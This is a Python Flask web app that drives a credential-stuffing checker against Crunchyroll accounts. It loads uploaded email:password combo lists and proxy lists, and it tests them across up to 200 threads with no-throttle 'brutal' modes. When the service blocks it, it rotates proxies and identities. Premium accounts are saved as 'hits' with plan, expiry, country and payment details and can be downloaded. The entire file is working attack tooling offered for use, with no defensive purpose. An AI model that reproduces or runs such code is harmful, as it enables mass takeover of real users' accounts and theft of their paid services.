from flask import Flask, render_template, request, jsonify, Response, send_file
import os
import json
import time
import threading
import queue
import uuid
from datetime import datetime
from werkzeug.utils import secure_filename

from gug import (
    CrunchyrollChecker, ProxyManager, StatsTracker, AdaptiveThrottler,
    check_account, save_hit, save_special_status, format_account_line,
    is_valid_email, is_blacklisted_domain, export_results_json, export_results_csv
)

app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
app.config['UPLOAD_FOLDER'] = 'uploads'

os.makedirs('uploads', exist_ok=True)
os.makedirs('Hits/Crunchyroll/All Hits', exist_ok=True)

checker_state = {
    'running': False,
    'stop_requested': False,
    'stats': None,
    'results': None,
    'events': queue.Queue(),
    'thread': None,
    'combo_file': None,
    'proxy_file': None
}

def load_combos_from_file(filepath):
    combos = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if ':' in line:
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts[0].strip(), parts[1].strip()
                        if email and password:
                            if is_valid_email(email) and not is_blacklisted_domain(email):
                                combos.append((email, password))
    except Exception as e:
        print(f"Error loading combos: {e}")
    return combos

def send_event(event_type, data):
    checker_state['events'].put({'type': event_type, 'data': data, 'time': time.time()})

def run_checker(combo_file, proxy_file, threads, mode, max_retries):
    from collections import deque
    from concurrent.futures import ThreadPoolExecutor, as_completed
    
    checker_state['running'] = True
    checker_state['stop_requested'] = False
    
    combos = load_combos_from_file(combo_file)
    if not combos:
        send_event('error', {'message': 'No valid combos found'})
        checker_state['running'] = False
        return
    
    send_event('info', {'message': f'Loaded {len(combos)} combos'})
    
    proxy_manager = ProxyManager()
    if proxy_file and os.path.exists(proxy_file):
        proxy_manager.load_proxies(proxy_file)
        send_event('info', {'message': f'Loaded {len(proxy_manager.proxies)} proxies'})
    
    brutal_mode = mode in ['brutal', 'ultra', 'turbo']
    ultra_mode = mode in ['ultra']
    fast_mode = True
    
    results = {
        'premium': [],
        'free': [],
        'invalid': [],
        'password_reset': [],
        'locked': [],
        'email_verify': [],
        '2fa': [],
        'errors': []
    }
    checker_state['results'] = results
    
    stats = StatsTracker(len(combos))
    checker_state['stats'] = stats
    
    account_queue = deque()
    for email, password in combos:
        account_queue.append({'email': email, 'password': password, 'retries': 0})
    
    results_lock = threading.Lock()
    
    def check_single(account_data):
        if checker_state['stop_requested']:
            return None
            
        email = account_data['email']
        password = account_data['password']
        retries = account_data['retries']
        
        checker = CrunchyrollChecker(proxy_manager, brutal_mode, ultra_mode, fast_mode)
        result = check_account(checker, email, password, retries)
        status = result.get('status')
        
        stats.record_check(status)
        
        with results_lock:
            if status == 'premium':
                data = result.get('data', {})
                results['premium'].append(data)
                save_hit(data)
                send_event('hit', {
                    'email': email,
                    'plan': result.get('plan', 'Unknown'),
                    'expiry': data.get('Expiry', 'N/A'),
                    'country': data.get('Country', 'N/A')
                })
            elif status == 'free':
                results['free'].append(f'{email}:{password}')
                send_event('free', {'email': email})
            elif status == 'invalid':
                results['invalid'].append(f'{email}:{password}')
                send_event('invalid', {'email': email})
            elif status == 'password_reset':
                results['password_reset'].append(f'{email}:{password}')
                save_special_status(email, password, 'password_reset')
            elif status == 'locked':
                results['locked'].append(f'{email}:{password}')
                save_special_status(email, password, 'locked')
            elif status == 'email_verify':
                results['email_verify'].append(f'{email}:{password}')
                save_special_status(email, password, 'email_verify')
            elif status == '2fa':
                results['2fa'].append(f'{email}:{password}')
                save_special_status(email, password, '2fa')
            elif status == 'blocked':
                error = result.get('error', 'unknown')
                retry_count = result.get('retry_count', 0)
                if max_retries == 0 or retry_count < max_retries:
                    return {'requeue': True, 'email': email, 'password': password, 'retries': retry_count + 1}
                else:
                    results['errors'].append(f'{email}:{password} | {error}')
            else:
                error_msg = result.get('error', 'unknown')
                results['errors'].append(f'{email}:{password} | {error_msg}')
        
        send_event('progress', {
            'checked': stats.checked,
            'total': stats.total,
            'premium': stats.premium,
            'free': stats.free,
            'invalid': stats.invalid,
            'cpm': stats.get_cpm(),
            'eta': stats.get_eta()
        })
        
        return result
    
    try:
        if threads > 1:
            round_num = 1
            requeue_list = []
            
            while account_queue or requeue_list:
                if checker_state['stop_requested']:
                    break
                    
                if round_num > 1 and requeue_list:
                    send_event('info', {'message': f'Requeue round {round_num} - {len(requeue_list)} accounts'})
                    for acc in requeue_list:
                        account_queue.append(acc)
                    requeue_list = []
                    # Wait before retrying rate-limited accounts
                    time.sleep(5)
                
                accounts_list = list(account_queue)
                account_queue.clear()
                
                if not accounts_list:
                    break
                
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    futures = {executor.submit(check_single, acc): acc for acc in accounts_list}
                    for future in as_completed(futures, timeout=60):
                        if checker_state['stop_requested']:
                            break
                        try:
                            result = future.result(timeout=30)
                            if result and result.get('requeue'):
                                requeue_list.append({
                                    'email': result['email'],
                                    'password': result['password'],
                                    'retries': result['retries']
                                })
                        except Exception as e:
                            print(f"Thread error: {e}")
                
                round_num += 1
                if round_num > 50:
                    break
        else:
            throttler = AdaptiveThrottler(base_delay=0.5)
            checker = CrunchyrollChecker(proxy_manager, brutal_mode, ultra_mode, fast_mode)
            
            while account_queue:
                if checker_state['stop_requested']:
                    break
                    
                account = account_queue.popleft()
                email = account['email']
                password = account['password']
                retries = account['retries']
                
                result = check_account(checker, email, password, retries)
                status = result.get('status')
                
                stats.record_check(status)
                
                if status == 'blocked':
                    throttler.record_block()
                else:
                    throttler.record_success()
                
                with results_lock:
                    if status == 'premium':
                        data = result.get('data', {})
                        results['premium'].append(data)
                        save_hit(data)
                        send_event('hit', {
                            'email': email,
                            'plan': result.get('plan', 'Unknown'),
                            'expiry': data.get('Expiry', 'N/A'),
                            'country': data.get('Country', 'N/A')
                        })
                    elif status == 'free':
                        results['free'].append(f'{email}:{password}')
                        send_event('free', {'email': email})
                    elif status == 'invalid':
                        results['invalid'].append(f'{email}:{password}')
                        send_event('invalid', {'email': email})
                    elif status == 'password_reset':
                        results['password_reset'].append(f'{email}:{password}')
                        save_special_status(email, password, 'password_reset')
                    elif status == 'locked':
                        results['locked'].append(f'{email}:{password}')
                        save_special_status(email, password, 'locked')
                    elif status == 'email_verify':
                        results['email_verify'].append(f'{email}:{password}')
                        save_special_status(email, password, 'email_verify')
                    elif status == '2fa':
                        results['2fa'].append(f'{email}:{password}')
                        save_special_status(email, password, '2fa')
                    elif status == 'blocked':
                        error = result.get('error', 'unknown')
                        retry_count = result.get('retry_count', 0)
                        if max_retries == 0 or retry_count < max_retries:
                            checker._regenerate_identity()
                            account_queue.append({
                                'email': email,
                                'password': password,
                                'retries': retry_count + 1
                            })
                        else:
                            results['errors'].append(f'{email}:{password} | {error}')
                    else:
                        error_msg = result.get('error', 'unknown')
                        results['errors'].append(f'{email}:{password} | {error_msg}')
                
                send_event('progress', {
                    'checked': stats.checked,
                    'total': stats.total,
                    'premium': stats.premium,
                    'free': stats.free,
                    'invalid': stats.invalid,
                    'cpm': stats.get_cpm(),
                    'eta': stats.get_eta()
                })
                
                if not brutal_mode:
                    throttler.wait()
                    
    except Exception as e:
        send_event('error', {'message': str(e)})
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    results_file = f'uploads/results_{timestamp}.json'
    export_results_json(results, results_file)
    
    send_event('complete', {
        'premium': len(results['premium']),
        'free': len(results['free']),
        'invalid': len(results['invalid']),
        'errors': len(results['errors']),
        'results_file': results_file
    })
    
    checker_state['running'] = False

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload_files():
    if 'combos' not in request.files:
        return jsonify({'error': 'No combo file uploaded'}), 400
    
    combo_file = request.files['combos']
    if combo_file.filename == '':
        return jsonify({'error': 'No combo file selected'}), 400
    
    combo_filename = f"{uuid.uuid4().hex[:8]}_{secure_filename(combo_file.filename or 'combos.txt')}"
    combo_path = os.path.join(app.config['UPLOAD_FOLDER'], combo_filename)
    combo_file.save(combo_path)
    checker_state['combo_file'] = combo_path
    
    proxy_path = None
    if 'proxies' in request.files:
        proxy_file = request.files['proxies']
        if proxy_file.filename != '':
            proxy_filename = f"{uuid.uuid4().hex[:8]}_{secure_filename(proxy_file.filename or 'proxies.txt')}"
            proxy_path = os.path.join(app.config['UPLOAD_FOLDER'], proxy_filename)
            proxy_file.save(proxy_path)
            checker_state['proxy_file'] = proxy_path
    
    combos = load_combos_from_file(combo_path)
    
    return jsonify({
        'success': True,
        'combo_count': len(combos),
        'proxy_loaded': proxy_path is not None
    })

@app.route('/start', methods=['POST'])
def start_checker():
    if checker_state['running']:
        return jsonify({'error': 'Checker already running'}), 400
    
    if not checker_state['combo_file']:
        return jsonify({'error': 'No combo file uploaded'}), 400
    
    data = request.json or {}
    threads = min(max(int(data.get('threads', 10)), 1), 200)
    mode = data.get('mode', 'turbo')
    max_retries = int(data.get('max_retries', 3))
    
    thread = threading.Thread(
        target=run_checker,
        args=(checker_state['combo_file'], checker_state['proxy_file'], threads, mode, max_retries)
    )
    checker_state['thread'] = thread
    thread.start()
    
    return jsonify({'success': True, 'message': 'Checker started'})

@app.route('/stop', methods=['POST'])
def stop_checker():
    if not checker_state['running']:
        return jsonify({'error': 'Checker not running'}), 400
    
    checker_state['stop_requested'] = True
    return jsonify({'success': True, 'message': 'Stop requested'})

@app.route('/status')
def get_status():
    stats = checker_state['stats']
    results = checker_state['results']
    
    return jsonify({
        'running': checker_state['running'],
        'stats': {
            'checked': stats.checked if stats else 0,
            'total': stats.total if stats else 0,
            'premium': stats.premium if stats else 0,
            'free': stats.free if stats else 0,
            'invalid': stats.invalid if stats else 0,
            'cpm': stats.get_cpm() if stats else 0,
            'eta': stats.get_eta() if stats else 'N/A'
        } if stats else None,
        'results': {
            'premium': len(results['premium']) if results else 0,
            'free': len(results['free']) if results else 0,
            'invalid': len(results['invalid']) if results else 0,
            'errors': len(results['errors']) if results else 0
        } if results else None
    })

@app.route('/events')
def events():
    def generate():
        while True:
            try:
                event = checker_state['events'].get(timeout=30)
                yield f"data: {json.dumps(event)}\n\n"
            except queue.Empty:
                yield f"data: {json.dumps({'type': 'ping'})}\n\n"
    
    return Response(generate(), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive',
        'X-Accel-Buffering': 'no'
    })

@app.route('/hits')
def get_hits():
    results = checker_state['results']
    if not results:
        return jsonify({'hits': []})
    
    hits = []
    for acc in results['premium']:
        hits.append({
            'email': acc.get('Email', 'N/A'),
            'plan': acc.get('Plan', 'N/A'),
            'expiry': acc.get('Expiry', 'N/A'),
            'country': acc.get('Country', 'N/A'),
            'payment': acc.get('PaymentSource', 'N/A')
        })
    
    return jsonify({'hits': hits})

@app.route('/download/<file_type>')
def download_results(file_type):
    results = checker_state['results']
    if not results:
        return jsonify({'error': 'No results available'}), 404
    
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if file_type == 'json':
        filepath = f'uploads/results_{timestamp}.json'
        export_results_json(results, filepath)
        return send_file(filepath, as_attachment=True, download_name=f'crunchyroll_results_{timestamp}.json')
    elif file_type == 'csv':
        filepath = f'uploads/premium_{timestamp}.csv'
        export_results_csv(results, filepath)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True, download_name=f'crunchyroll_premium_{timestamp}.csv')
        return jsonify({'error': 'No premium accounts to export'}), 404
    elif file_type == 'txt':
        filepath = f'uploads/hits_{timestamp}.txt'
        with open(filepath, 'w', encoding='utf-8') as f:
            for acc in results['premium']:
                f.write(format_account_line(acc) + '\n')
        return send_file(filepath, as_attachment=True, download_name=f'crunchyroll_hits_{timestamp}.txt')
    
    return jsonify({'error': 'Invalid file type'}), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
